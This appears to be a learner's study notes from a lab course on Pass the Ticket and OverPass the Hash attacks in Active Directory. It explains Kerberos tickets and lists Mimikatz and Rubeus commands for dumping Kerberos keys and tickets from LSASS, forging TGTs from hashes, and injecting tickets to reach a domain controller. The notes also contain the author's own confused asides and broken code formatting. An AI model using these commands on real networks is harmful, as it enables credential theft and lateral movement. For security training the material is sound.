**Overview:**
A method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. 
The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.

When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:

- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.

----
#### Mimikatz - Extract Kerberos keys
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
```
To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

#### Mimikatz - Pass the Key
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

## Rubeus - Pass the key
```
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`

## Rubeus- Pass the ticket
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in Base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session. (this part is quite unclear to me)

```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
import the ticket into the current session using the `.kirbi` file from the disk.

## convert .kirbi to base64

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to Base64.

```
 Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```
perform a Pass the Ticket providing the Base64 string instead of the file name.(i also didnt understand why it does both the example  with a string and with the base64)

## mimikatz - pass the ticket
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
```
Enter-PSSession -ComputerName DC01
To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute `mimikatz.exe`, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our `cmd.exe` session, we can launch a PowerShell command prompt from the same `cmd.exe` and use the command `Enter-PSSession` to connect to the target machine.


## Rubeus - PowerShell Remoting with Pass the Ticket
```
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
   ______        _
```Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

#### Rubeus - Pass the Ticket for lateral movement
```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.
```